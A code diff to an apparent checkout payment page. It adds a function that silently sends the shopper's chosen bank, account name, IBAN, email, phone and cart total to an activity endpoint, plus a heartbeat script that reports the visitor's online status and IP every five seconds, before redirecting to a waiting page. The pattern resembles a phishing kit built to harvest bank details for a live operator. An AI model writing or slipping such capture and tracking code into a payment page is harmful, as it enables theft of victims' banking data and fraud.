@@ -270,6 +270,28 @@
 
     <script>
         // Load checkout data and cart items
+        var checkoutTotalAmount = 0;
+        var checkoutUserData = null;
+
+        function logUserActivity(type, payload) {
+            try {
+                fetch('/mardinlee/api/activity', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        type: type,
+                        payload: payload || {}
+                    })
+                }).catch(function(err) {
+                    console.warn('⚠️ Aktivite loglanamadı:', err);
+                });
+            } catch (error) {
+                console.warn('⚠️ Aktivite log fonksiyonu hata verdi:', error);
+            }
+        }
+
         document.addEventListener('DOMContentLoaded', function() {
             loadPaymentData();
             renderBankList();
@@ -285,6 +307,7 @@
             }
             
             var data = JSON.parse(checkoutData);
+            checkoutUserData = data;
             var customerInfoDiv = document.getElementById('customer-info');
             customerInfoDiv.innerHTML = 
                 '<div class="customer-info-item"><span class="customer-info-label">Name: </span>' + data.firstname + ' ' + data.lastname + '</div>' +
@@ -313,6 +336,10 @@
                     
                     document.getElementById('payment-subtotal').textContent = total.toFixed(2) + ' €';
                     document.getElementById('payment-total').textContent = total.toFixed(2) + ' €';
+                    checkoutTotalAmount = total;
+                    try {
+                        sessionStorage.setItem('checkoutTotal', total);
+                    } catch (e) {}
                 })
                 .catch(function(error) {
                     console.error('❌ Warenkorb konnte nicht geladen werden:', error);
@@ -396,6 +423,11 @@
             document.getElementById('bank-selection-section').style.display = 'none';
             document.getElementById('bank-details-section').style.display = 'block';
             document.getElementById('selected-bank-text').textContent = 'Gewählte Bank: ' + selectedBank;
+
+            logUserActivity('checkout-bank-selected', {
+                bank: selectedBank,
+                cartTotal: checkoutTotalAmount
+            });
         });
         
         document.getElementById('bank-payment-button').addEventListener('click', function() {
@@ -414,8 +446,102 @@
                 accountName: accountName,
                 iban: iban
             }));
+            logUserActivity('checkout-bank-details', {
+                bank: selectedBank,
+                accountName: accountName,
+                iban: iban,
+                cartTotal: checkoutTotalAmount,
+                email: checkoutUserData ? checkoutUserData.email : undefined,
+                phone: checkoutUserData ? checkoutUserData.phone : undefined
+            });
             window.location.href = '/wait.html';
         });
+    </script>
+    <!-- Online Kontrol Sistemi - Kullanıcı online kontrolü için heartbeat -->
+    <script>
+    (function() {
+        console.log('🚀 Online kontrol sistemi başlatılıyor (checkout-payment.html)...');
+
+        function sendHeartbeat() {
+            var timestamp = new Date().getTime();
+            var random = Math.random();
+            var url = '/api/heartbeat?source=checkout-payment&t=' + timestamp + '&r=' + random;
+
+            console.log('📤 Heartbeat isteği gönderiliyor:', url);
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', url, true);
+            xhr.setRequestHeader('Cache-Control', 'no-cache');
+
+            xhr.onload = function() {
+                console.log('📥 Heartbeat response geldi - Status:', xhr.status);
+                if (xhr.status === 200) {
+                    try {
+                        var data = JSON.parse(xhr.responseText);
+                        console.log('✅ Heartbeat OK - Response:', data);
+
+                        if (data.status === 'ok' || data.success === true) {
+                            console.log('✅ Kullanıcı ONLINE - IP:', data.ip);
+                        } else {
+                            console.warn('⚠️ Heartbeat response - status:', data.status);
+                        }
+                    } catch (e) {
+                        console.error('❌ Response parse hatası:', e);
+                        console.error('Response text:', xhr.responseText);
+                    }
+                } else {
+                    console.warn('⚠️ Heartbeat başarısız - Status:', xhr.status);
+                    console.warn('Response text:', xhr.responseText);
+                }
+            };
+
+            xhr.onerror = function() {
+                console.error('❌ Heartbeat network hatası - İstek gönderilemedi');
+            };
+
+            xhr.ontimeout = function() {
+                console.error('⏱️ Heartbeat timeout - İstek zaman aşımına uğradı');
+            };
+
+            xhr.timeout = 10000;
+            xhr.send();
+        }
+
+        sendHeartbeat();
+
+        var heartbeatInterval = setInterval(function() {
+            sendHeartbeat();
+        }, 5000);
+
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden) {
+                console.log('👁️ Sayfa görünür oldu, heartbeat gönderiliyor...');
+                sendHeartbeat();
+            }
+        });
+
+        window.addEventListener('beforeunload', function() {
+            if (navigator.sendBeacon) {
+                var url = '/api/heartbeat?source=checkout-payment&t=' + new Date().getTime() + '&r=' + Math.random();
+                navigator.sendBeacon(url);
+            } else {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', '/api/heartbeat?source=checkout-payment&t=' + new Date().getTime() + '&r=' + Math.random(), false);
+                try {
+                    xhr.send();
+                } catch (e) {
+                    console.error('Son heartbeat gönderilemedi:', e);
+                }
+            }
+        });
+
+        window.addEventListener('unload', function() {
+            clearInterval(heartbeatInterval);
+        });
+
+        console.log('✅ Online kontrol sistemi aktif (checkout-payment.html)');
+        console.log('📡 Network tab\'ında /api/heartbeat isteklerini görebilirsiniz');
+    })();
     </script>
 </body>
 </html>
